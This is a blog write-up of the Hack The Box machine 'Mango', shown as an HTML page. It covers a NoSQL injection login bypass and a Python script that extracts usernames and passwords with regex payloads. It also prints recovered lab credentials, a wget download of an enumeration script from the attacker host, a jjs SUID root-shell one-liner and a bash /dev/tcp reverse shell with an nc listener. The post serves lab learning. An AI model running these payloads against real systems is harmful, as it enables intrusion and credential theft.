<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
  content="Brian G.">
<meta name="description"
  content="Welcome to another Forest Hex hacking adventure! üå≤üèπ Today I&amp;rsquo;ll be hacking an HTB box Named Mango.
 As always, we start with a port scan. Feel free to jump around.
 Port Scan Investigating the Web Server Exploiting the Login Page Creating a Python Script The Final Script Getting User Getting Root   Port Scan Port Scan  Pretty standard here, SSH and a web server running on port 80 and 443 for http and https respectively." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://foresthex.com/posts/hack-the-box-mango/" />


<title>
  
  Hack The Box - Mango :: Forest Hex  ‚Äî An exploration of hacking and programming.
  
</title>




<script async src="https://www.googletagmanager.com/gtag/js?id=UA-148164972-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag() { dataLayer.push(arguments); }
  gtag('js', new Date());

  gtag('config', 'UA-148164972-1');
</script>


<link href="https://foresthex.com/flag-icon.min.css" rel="stylesheet" type="text/css">



<link rel="stylesheet" href="https://foresthex.com/main.min.bb5519c9e00fc0c254312c28c9a1478d2dd72eea45317a8fe6c9ed612e1fe53d.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://foresthex.com/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://foresthex.com/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://foresthex.com/favicon-16x16.png">
    <link rel="manifest" href="https://foresthex.com/site.webmanifest">
    <link rel="mask-icon" href="https://foresthex.com/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="https://foresthex.com/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">

<meta itemprop="name" content="Hack The Box - Mango">
<meta itemprop="description" content="Ah, the delicious taste of root. Come have a bite of NoSQLi, I promise it&#39;s tasty.">
<meta itemprop="datePublished" content="2020-06-04T00:00:00+00:00" />
<meta itemprop="dateModified" content="2020-06-04T00:00:00+00:00" />
<meta itemprop="wordCount" content="2223">



<meta itemprop="keywords" content="ctf,HackTheBox,pentesting,NoSQLi,Python,Custom Exploitation," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hack The Box - Mango"/>
<meta name="twitter:description" content="Ah, the delicious taste of root. Come have a bite of NoSQLi, I promise it&#39;s tasty."/>





<meta property="article:published_time" content="2020-06-04 00:00:00 &#43;0000 UTC" />






<meta name="twitter:image" content="https://foresthex.com/posts/hack-the-box-mango/1575440078.png" />
<meta name="itemprop:image" content="https://foresthex.com/posts/hack-the-box-mango/1575440078.png" />
<meta name="twitter:card" content="summary_large_image">
    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://foresthex.com/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text" style="font-family:consolas;">$ cd /home</span>
            <span class="logo__cursor" style="background-color:#3f913d"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://foresthex.com/about/">about</a></li><li><a href="https://foresthex.com/tags/">tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>11 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title">
                <a href="https://foresthex.com/posts/hack-the-box-mango/">Hack The Box - Mango</a>
            </h1>

            

            <div class="post-content">
                <h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! üå≤üèπ</h3>
<p><em>Today I&rsquo;ll be hacking an HTB box Named Mango.</em></p>

    <figure class="left" >
        <img src="1575440078.png"   />

        
    </figure>


<p>As always, we start with a port scan. Feel free to jump around.</p>
<ul>
<li><a href="#port-scan">Port Scan</a></li>
<li><a href="#investigating-the-web-server">Investigating the Web Server</a></li>
<li><a href="#exploiting-the-login-page">Exploiting the Login Page</a></li>
<li><a href="#creating-a-python-script">Creating a Python Script</a></li>
<li><a href="#the-final-script">The Final Script</a></li>
<li><a href="#getting-user">Getting User</a></li>
<li><a href="#getting-root">Getting Root</a></li>
</ul>
<hr>
<h1 id="port-scan">Port Scan</h1>

    <figure class="left" >
        <img src="1575440838.png"   />

        
            <figcaption class="center" >Port Scan</figcaption>
        
    </figure>


<p>Pretty standard here, SSH and a web server running on port 80 and 443 for http and https respectively.
It looks like the port 80 one got a 403 error from nmap so let&rsquo;s check out the https one.</p>
<hr>
<h1 id="investigating-the-web-server">Investigating the Web Server</h1>

    <figure class="left" >
        <img src="1575440976.png"   />

        
            <figcaption class="center" >Home Site</figcaption>
        
    </figure>


<p>A google clone, neat. From the looks of it I can use the analytics page with full functionality. It&rsquo;s using PHP according to wappalyzer, and not much else.</p>
<p>After some investigation it turned out the analytics is running software called flexmonster. There may be exploit potential there, but first I decided to load up ZAP and run a vuln scan. It came up empty for the most part, nothing useful.</p>
<p>Searchsploit came up with nothing about flexmonster exploits, and a google search showed some potential but sparse forum posts from concerned users rather than disclosures. I decided to try gobuster at this point to find any hidden directories.</p>
<p><code>gobuster dir -u &quot;https://10.10.10.162/&quot; -r -a &quot;Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k</code></p>
<p><code>-k</code> ignores SSL issues, <code>-a</code> sets my user-agent to a normal one in case they have detection, and <code>-r</code> follows redirects. I point it to a decent directory list and go.</p>

    <figure class="left" >
        <img src="1575445364.png"   />

        
            <figcaption class="center" >GoBuster Running</figcaption>
        
    </figure>



    <figure class="left" >
        <img src="1575472573.png"   />

        
            <figcaption class="center" >No GoBuster Results</figcaption>
        
    </figure>


<p>No luck, just a forbidden apache page. I decided to try nikto next, an apache web server scanner.
<code>nikto -host &quot;https://10.10.10.162&quot;</code></p>
<p>Off the bat we got some domain info from the SSL cert:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">CN<span style="color:#f92672">=</span>staging-order.mango.htb
emailAddress<span style="color:#f92672">=</span>admin@mango.htb
</code></pre></div><p>I also should have noticed that from the nmap scan. While nikto was running I decided to add the hostname to <code>/etc/hosts</code> and navigate to it.</p>
<h1 id="exploiting-the-login-page">Exploiting the Login Page</h1>
<p>
    <figure class="left" >
        <img src="1575474049.png"   />

        
            <figcaption class="center" >Login Page</figcaption>
        
    </figure>


Paydirt! Here&rsquo;s a login page and we at least know there&rsquo;s one user named admin probably.</p>
<p>I played around with this page for quite a while. I ran a ZAP vuln scan and test some basic SQL injection but had no luck. I ran nikto and even wapiti, but came up empty.</p>

    <figure class="left" >
        <img src="1575601487.png"   />

        
            <figcaption class="center" >No Vulns Found</figcaption>
        
    </figure>


<p>I then decided to try some other forms of injection, maybe it&rsquo;s not running SQL at all. I looked up some NoSQL injection techniques and after a little playing around I found a way in. I had to modify the POST request to get it to work, which was easy since I had the site loaded in a ZAP proxy which injects a nice front end on top of the site. Check it out:</p>

    <figure class="left" >
        <img src="gotin.gif"   />

        
            <figcaption class="center" >NoSQLi</figcaption>
        
    </figure>


<p>As you can see we are able to login, but it&rsquo;s kind of useless at the moment. It&rsquo;s under construction and investigating the source doesn&rsquo;t reveal any new information. However, armed with a success case for NoSQLi, we can brute force character by character to get account information. This could let us into other places, perhaps even SSH access if we are lucky.</p>
<p>Now I&rsquo;m not familiar with mongoDB, which is the DB being used based on the noSQL injection that worked, but I&rsquo;ve learned enough to know where to look.</p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/query/">https://docs.mongodb.com/manual/reference/operator/query/</a> - A lovely reference on what&rsquo;s called Query and Projection operators. This is why the injection works using <code>$gt</code>, it stands for greater than and will change the logic that checks for a valid password. In short, instead of checking if you have the user password right, it will check if the user&rsquo;s password is greater than NULL. Since everything evaluates to greater than null it will always be true and it lets you in.</p>
<p>I found a more specific blog post about what I&rsquo;m trying to achieve here:
<a href="https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/">https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/</a></p>
<p>The jist of it is, we can extract information by using <code>{username: {$regex: &lt;char_to_test&gt;.*}}</code>. Mongo will evaluate the regular expression that&rsquo;s provided. Regex is a pretty big topic of it&rsquo;s own, but for here you only need to know that <code>.*</code> translates to mean match anything, so as long as I get <code>&lt;char_to_test&gt;</code> right it will evaluate to true and let me in.</p>
<hr>
<h1 id="creating-a-python-script">Creating a Python Script</h1>
<p>Now the page above is a good starting point, but a lot of changes are in order:</p>
<ul>
<li>No testing regex special characters.</li>
<li>Users are not enumerated.</li>
<li>No valid PHP session id.</li>
</ul>
<p>To test for regex special characters we need to escape them with <code>\</code>. This means it will take 2 characters to test these and iterating over a string will no longer work. The solution is to iterate over an array.</p>
<h4 id="adding-regex-special-characters">Adding Regex Special Characters</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">char_str <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;~&#39;`!@#%_=,:;/</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
regex_escapes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;\{&#39;</span>, <span style="color:#e6db74">&#39;\}&#39;</span>, <span style="color:#e6db74">&#39;\*&#39;</span>, <span style="color:#e6db74">&#39;\^&#39;</span>, <span style="color:#e6db74">&#39;\+&#39;</span>, <span style="color:#e6db74">&#39;\?&#39;</span>, <span style="color:#e6db74">&#39;\-&#39;</span>, <span style="color:#e6db74">&#39;\&amp;&#39;</span>, <span style="color:#e6db74">&#39;\(&#39;</span>, <span style="color:#e6db74">&#39;\)&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;\&lt;&#39;</span>, <span style="color:#e6db74">&#39;\&gt;&#39;</span>, <span style="color:#e6db74">&#39;\|&#39;</span>]
chars_to_test <span style="color:#f92672">=</span> list(char_str) <span style="color:#f92672">+</span> regex_escapes
</code></pre></div><p>The above code takes all single character possibilities that aren&rsquo;t regex special characters and combines them into a single string: <code>char_str</code>.  It then defines an array of escaped regex special characters, and finally it converts <code>char_str</code> into a list and concatenate it to the list of escaped regular expressions.</p>
<p>I can now iterate <code>chars_to_test</code> and it will test all special characters, including those which would normally be interperted differently in the regular expression.</p>
<hr>
<h4 id="extracting-users">Extracting Users</h4>
<p>To grab the users instead of the password the payload has to be changed:
<code>username[$regex]=^&lt;CHAR_TO_TEST&gt;.*&amp;password[$gt]=&amp;login=login</code></p>
<p>Also the method should be different. It&rsquo;s possible to have user with several of the same starting letters, so instead of stopping at the first character we match the logic will go as follows:</p>
<pre><code>1. Start with an empty list of users.
2. Send users to a function which will attempt to find all users.
   a. If the list is empty:       
      i. Iterate through every character to test.
      ii. Append to new list if valid.
      iii. Return new list of valid characters.
   b. If the list is not empty:
      i. Iterate through each user in the list.
         a. Iterate through every character to test, appending it to the username.
         b. Append to new list if valid.
         c. Return list list of valid user strings.
3. If the original list of users == the new list:
   a. Return the list, users fully enumerated at this point.
4. If the original list of users != the new list:
   a. Replace the original list of users with the new one.
   b. Return to step 2 where we send users to function.

</code></pre><p>This method ensures the script won&rsquo;t stop at the first valid character for each attempt, and will allow the known users list size to increase as it finds more valid combinations.</p>
<p><code>['a', 'm']</code> could turn into <code>['ad', 'ma', 'mi']</code> for example if we had <code>admin</code>, <code>matt</code>, and <code>mike</code> as valid values. Once the new list returned is the same as the old one then there is no reason to continue enumerating as it would just repeat infinitely.</p>
<hr>
<h4 id="grabbing-the-php-session-id">Grabbing the PHP Session ID</h4>
<p>It&rsquo;s important to keep the headers valid for these requests. To do so I just copied the valid headers I interecepted in ZAP and did a little regex replace magic to create a dictionary object in python for use with the popular <code>requests</code> module. One issue with just using it directly like that is the PHP Session ID cookie changes, and I don&rsquo;t want to manually update it every time it expires.</p>
<p>Grabbing it is very easy with the <code>requests</code> module:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">grab_sessid_header</span>():
    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span>, headers<span style="color:#f92672">=</span>headers, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span>False)
    phpid <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>]
    cookie_header <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Cookie&#39;</span>: f<span style="color:#e6db74">&#39;PHPSESSID={phpid}&#39;</span>}
    <span style="color:#66d9ef">return</span> cookie_header
</code></pre></div><p>As well as adding it to your <code>headers</code> dictionary:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">headers<span style="color:#f92672">.</span>update(grab_sessid_header())
</code></pre></div><hr>
<h1 id="the-final-script">The Final Script</h1>
<p>The end result is a script that enumerates all users first, and then attempts to find the passwords for each.
You can see it in action:</p>

    <figure class="left" >
        <img src="cracking.gif"   />

        
            <figcaption class="center" >Script in Action</figcaption>
        
    </figure>


<p>Here&rsquo;s the full script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> string
<span style="color:#75715e"># proxies = {&#34;http&#34;: &#34;http://127.0.0.1:12480&#34;, &#34;https&#34;: &#34;http://127.0.0.1:12480&#34;}</span>
proxies <span style="color:#f92672">=</span> {}
headers <span style="color:#f92672">=</span> {
<span style="color:#e6db74">&#39;User-Agent&#39;</span>:<span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0&#39;</span>,
<span style="color:#e6db74">&#39;Accept&#39;</span>:<span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span>,
<span style="color:#e6db74">&#39;Accept-Language&#39;</span>:<span style="color:#e6db74">&#39;en-US,en;q=0.5&#39;</span>,
<span style="color:#e6db74">&#39;Content-Type&#39;</span>:<span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
<span style="color:#e6db74">&#39;Origin&#39;</span>:<span style="color:#e6db74">&#39;https://staging-order.mango.htb&#39;</span>,
<span style="color:#e6db74">&#39;Connection&#39;</span>:<span style="color:#e6db74">&#39;keep-alive&#39;</span>,
<span style="color:#e6db74">&#39;Referer&#39;</span>:<span style="color:#e6db74">&#39;https://staging-order.mango.htb/&#39;</span>,
<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>:<span style="color:#e6db74">&#39;1&#39;</span>,
<span style="color:#e6db74">&#39;Host&#39;</span>:<span style="color:#e6db74">&#39;staging-order.mango.htb&#39;</span>
}

<span style="color:#75715e"># Returns Chars: [a, c], stops at first if desired, this is useful for passwords</span>
<span style="color:#75715e"># Expects &lt;CHAR&gt;, replaces with actual char</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_chars</span>(payload, stop_at_first <span style="color:#f92672">=</span> False):
    valid_chars <span style="color:#f92672">=</span> []
    char_str <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;~&#39;`!@#%_=,:;/</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
    regex_escapes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;\{&#39;</span>, <span style="color:#e6db74">&#39;\}&#39;</span>, <span style="color:#e6db74">&#39;\*&#39;</span>, <span style="color:#e6db74">&#39;\^&#39;</span>, <span style="color:#e6db74">&#39;\+&#39;</span>, <span style="color:#e6db74">&#39;\?&#39;</span>, <span style="color:#e6db74">&#39;\-&#39;</span>, <span style="color:#e6db74">&#39;\&amp;&#39;</span>, <span style="color:#e6db74">&#39;\(&#39;</span>, <span style="color:#e6db74">&#39;\)&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;\&lt;&#39;</span>, <span style="color:#e6db74">&#39;\&gt;&#39;</span>, <span style="color:#e6db74">&#39;\|&#39;</span>]
    chars_to_test <span style="color:#f92672">=</span> list(char_str) <span style="color:#f92672">+</span> regex_escapes
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> chars_to_test:
        data <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&lt;CHAR&gt;&#39;</span>, i)
        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span>, data<span style="color:#f92672">=</span>data, allow_redirects<span style="color:#f92672">=</span>False, headers<span style="color:#f92672">=</span>headers, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span>False)
        <span style="color:#66d9ef">if</span> res<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>:
            valid_chars<span style="color:#f92672">.</span>append(i[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:])
            <span style="color:#66d9ef">if</span> stop_at_first:
                <span style="color:#66d9ef">return</span> valid_chars
    <span style="color:#66d9ef">return</span> valid_chars

<span style="color:#75715e"># Iterates through all known starts to user strings, attempts to find all valid chars for each</span>
<span style="color:#75715e"># Returns an updated list of found users</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_users</span>(users):
    user_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;username[$regex]=^&lt;CHAR&gt;.*&amp;password[$gt]=&amp;login=login&#39;</span>
    new_found_users <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">if</span> len(users) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        found_users <span style="color:#f92672">=</span> iterate_chars(user_payload)
        <span style="color:#66d9ef">print</span>(found_users)
        <span style="color:#66d9ef">return</span> found_users
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users:
            user_payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;username[$regex]=^{user}&lt;CHAR&gt;.*&amp;password[$gt]=&amp;login=login&#39;</span>
            new_chars <span style="color:#f92672">=</span> iterate_chars(user_payload)
            <span style="color:#66d9ef">if</span> len(new_chars) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
                new_found_users<span style="color:#f92672">.</span>append(user)
            <span style="color:#66d9ef">else</span>:  
                <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> new_chars:
                    new_found_users<span style="color:#f92672">.</span>append(user<span style="color:#f92672">+</span>char[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:])
        <span style="color:#66d9ef">print</span>(new_found_users)
        <span style="color:#66d9ef">return</span> new_found_users 

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_user_password</span>(user):
    found_chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
    <span style="color:#66d9ef">while</span> True:
        pass_payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;username={user}&amp;password[$regex]=^{found_chars}&lt;CHAR&gt;.*&amp;login=login&#39;</span>
        new_char <span style="color:#f92672">=</span> iterate_chars(pass_payload, True)
        <span style="color:#66d9ef">if</span> len(new_char) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">break</span>
        found_chars <span style="color:#f92672">+=</span> new_char[<span style="color:#ae81ff">0</span>]
        <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;{user}: {found_chars}&#39;</span>)
    <span style="color:#66d9ef">return</span> found_chars

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_passwords</span>(users):
    creds <span style="color:#f92672">=</span> { user : <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users}
    <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> creds:
        creds[user] <span style="color:#f92672">=</span> find_user_password(user)
    <span style="color:#66d9ef">return</span> creds

<span style="color:#75715e"># Returns the PHP session ID as a header for requests to update with</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">grab_sessid_header</span>():
    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span>, headers<span style="color:#f92672">=</span>headers, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span>False)
    phpid <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>]
    cookie_header <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Cookie&#39;</span>: f<span style="color:#e6db74">&#39;PHPSESSID={phpid}&#39;</span>}
    <span style="color:#66d9ef">return</span> cookie_header

<span style="color:#75715e"># Returns an array of usernames</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_all_users</span>():
    found_users <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">while</span> True:
        new_found_users <span style="color:#f92672">=</span> iterate_users(found_users)
        <span style="color:#66d9ef">if</span> new_found_users <span style="color:#f92672">==</span> found_users: 
            <span style="color:#66d9ef">print</span>(found_users)
            <span style="color:#66d9ef">break</span>
        found_users <span style="color:#f92672">=</span> new_found_users
    <span style="color:#66d9ef">return</span> found_users

<span style="color:#75715e"># Grab a new session id first</span>
headers<span style="color:#f92672">.</span>update(grab_sessid_header())
users <span style="color:#f92672">=</span> find_all_users()
<span style="color:#75715e"># users = [&#39;admin&#39;, &#39;mango&#39;]</span>
<span style="color:#75715e"># {&#39;admin&#39;: &#39;t9KcS3&gt;!0B#2&#39;, &#39;mango&#39;: &#39;h3mXK8RhU~f{]f5H&#39;}</span>
creds <span style="color:#f92672">=</span> iterate_passwords(users)
<span style="color:#66d9ef">print</span>(creds)
</code></pre></div><p>You can see the credentials it found above.</p>
<hr>
<h1 id="getting-user">Getting User</h1>
<p>The credentials worked for <code>mango</code> but not <code>admin</code>.
<code>ssh mango@mango.htb</code></p>
<p>There was no <code>user.txt</code> file in his home folder, I decided to use <code>find</code> to locate it.
<code>find / -name user.txt  2&gt;&amp;1 | grep -v &quot;Permission denied&quot;</code></p>

    <figure class="left" >
        <img src="1575759645.png"   />

        
            <figcaption class="center" >Found user.txt</figcaption>
        
    </figure>


<p>Ah ha, it&rsquo;s under admin! Maybe the password will work locally if I just use <code>su admin</code></p>

    <figure class="left" >
        <img src="1575759733.png"   />

        
            <figcaption class="center" >User Flag</figcaption>
        
    </figure>


<p>Nice, got it. This was a pretty fun route to user, I always enjoy creating my own exploits.</p>
<hr>
<h1 id="getting-root">Getting Root</h1>
<p>This shell looks weird immediately. I run <code>/bin/bash</code> and it returns to the normal prompt, prepended with the user and current directory.</p>
<p>I then checked out what processes were running as root, apache was one of them. I checked the version number: 2.4.29, vulnerable to a local privesc: <a href="https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html">https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html</a></p>
<p>I don&rsquo;t really want to wait around until 6:45 am, and I don&rsquo;t have rights to change the time on the machine so I can&rsquo;t force it. It&rsquo;s time to run <code>lse.sh</code> and see what it says. I downloaded it onto the victim by using <code>python -m SimpleHTTPServer</code> on kali in the folder I have <code>lse.sh</code>.</p>
<p>On the victim I ran: <code>wget http://10.10.14.66:8000/lse.sh</code> and then <code>chmod +x lse.sh</code> to download it and allow it to be executed. It came back with a couple of unusual SUID binaries:</p>

    <figure class="left" >
        <img src="1575830306.png"   />

        
    </figure>


<p>Mailcap seemed to require sudo access to get root. I gave it a shot, but it asked for a sudo password and neither of the passwords I have worked.</p>
<p>JJS seemed more promising, I found it also listed on GTFOBins: <a href="https://gtfobins.github.io/gtfobins/jjs/">https://gtfobins.github.io/gtfobins/jjs/</a></p>
<p>It looks like if the SUID bit is set, you can get root without sudo. You can see the commands at the bottom:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo sh -c <span style="color:#e6db74">&#39;cp $(which jjs) .; chmod +s ./jjs&#39;</span>

echo <span style="color:#e6db74">&#34;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> &gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> 2&gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;).waitFor()&#34;</span> | ./jjs
</code></pre></div><p>Now wait, there&rsquo;s sudo in the first command!</p>
<p>Yep, but look at the command, it&rsquo;s copying JJS and setting the SUID bit on it. The binary on the system I&rsquo;m hacking already has this set so I don&rsquo;t need to run that command. I&rsquo;ll also need to change the binary the second command is piped into.</p>

    <figure class="left" >
        <img src="1575830716.png"   />

        
            <figcaption class="center" >Root ... but, not quite.</figcaption>
        
    </figure>


<p>It looks like I popped a root shell consider the prompt changed from <code>$</code> into <code>#</code>.
But&hellip; I can&rsquo;t interact with it. It&rsquo;s blinking, but any input is just ignored. Shame really, but there&rsquo;s a solution, instead of spawning a local shell I can spawn a reverse shell and the input issue should be resolved. I usually grab one from here:
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></p>
<p>First I&rsquo;ll test if I can pop a reverse shell manually with the following commands:</p>
<pre><code>On Victim: `/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.66/15462 0&gt;&amp;1`
On Host: `nc -nvlp 15462`
</code></pre>
    <figure class="left" >
        <img src="1575831156.png"   />

        
    </figure>



    <figure class="left" >
        <img src="1575831185.png"   />

        
    </figure>


<p>It works! I got a shell from the user running the command, so if I can get JJS to run it as root I should get a root shell.
After a lot of playing around I did not manage to pop a reverse shell.</p>
<hr>
<h2 id="finally-getting-it-to-work">Finally getting it to work</h2>
<p>I realized at one point that it was running <code>dash</code> instead of <code>bash</code> and maybe that was messing up the prompt input.</p>
<p>I changed the command to:
<code>echo &quot;Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc \$@|sh\${IFS}-p _ echo /bin/bash -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)').waitFor()&quot; | jjs</code></p>
<p>As I typed the input did not show, but I tried it anyway:</p>

    <figure class="left" >
        <img src="1575833023.png"   />

        
            <figcaption class="center" >Root Flag</figcaption>
        
    </figure>


<p>Success! Although I couldn&rsquo;t see my input the commands were now run. This was a very enjoyable box and I learned a lot about noSQL injection. Until next time this is Brian G. signing off!</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
                <p>
